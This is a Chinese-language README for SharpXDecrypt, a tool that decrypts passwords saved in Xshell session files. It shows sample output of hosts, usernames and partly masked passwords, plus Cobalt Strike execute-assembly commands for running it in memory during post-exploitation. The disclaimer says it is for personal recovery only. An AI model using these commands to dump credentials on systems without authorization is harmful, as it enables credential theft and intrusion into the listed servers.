# SharpXDecrypt

## 声明

本程序仅供个人恢复密码使用，如果代码中存在侵权行为，请联系我们删除。



## 简介

Xshell全版本凭证一键恢复工具，针对Xshell全版本在本地保存的密码进行解密，包括最新的7系列版本！



## 使用方法

#### cmd.exe 自动寻找session路径

```
C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Debug> .\SharpXDecrypt.exe

Xshell全版本凭证一键导出工具!(支持最新Xshell 7系列版本!)
Author: 0pen1
Github: https://github.com/JDArmy
[!] WARNING: For learning purposes only,please delete it within 24 hours after downloading!

[*] Start GetUserPath....
  UserPath: E:\NetSarang Computer\xshell6
  UserPath: C:\Users\asus\Documents\NetSarang Computer\7
[*] Get UserPath Success !

[*] Start GetUserSID....
  Username: asus
  userSID: S-1-5-21-736521517-423******97-1340300005-1001
[*] GetUserSID Success !

  XSHPath: E:\NetSarang Computer\xshell6\Xshell\Sessions\192.168.1.110.xsh
  Host: 192.168.1.110
  UserName: wwwuser
  Password: www*******Aqx
  Version: 6.0

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\192.168.1.110.xsh
  Host: 192.168.1.110
  UserName: wwwuser
  Password: ww********Aqx
  Version: 7.1

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\Tokyo.xsh
  Host: 198.13.51.134
  UserName: root
  Password: W8*********PN__%
  Version: 7.1
```

#### cmd.exe 指定session路径

```
C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Release> .\SharpXDecrypt.exe "C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions"

Xshell全版本凭证一键导出工具!(支持Xshell 7.0+版本)
Author: 0pen1
Github: https://github.com/JDArmy
[!] WARNING: For learning purposes only,please delete it within 24 hours after downloading!

[*] Start GetUserSID....
  Username: asus
  userSID: S-1-5-21-736521517-4232353097-1340300005-1001
[*] GetUserSID Success !

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\192.168.1.110.xsh
  Host: 192.168.1.110
  UserName: wwwuser
  Password: www*******qx
  Version: 7.1

  XSHPath: C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions\新建会话.xsh
  Host: 127.0.0.1
  UserName: root
  Password: 78******6
  Version: 7.1

[*] read done!
```


#### Cobalt Strike

```
execute-assembly /path/to/SharpXDecrypt.exe
execute-assembly /path/to/SharpXDecrypt.exe  "C:\Users\asus\Documents\NetSarang Computer\7\Xshell\Sessions"
```



## 更新日志 

- v0.1.0, 2022-02-22, 创建
- v0.1.1, 2022-02-23, 修复中文用户名解密失败问题
- v0.1.2, 2022-02-23, 修复Xshell5执行报错问题，增加指定session路径功能
- v0.1.3, 2022-02-25, 修复7.0版本解密问题
- v0.1.4, 2022-03-02, 处理UserDataPath获取失败后程序异常终止问题。



## 致谢

暂无



## 参考

https://github.com/HyperSine/how-does-Xmanager-encrypt-password

https://github.com/uknowsec/SharpDecryptPwd

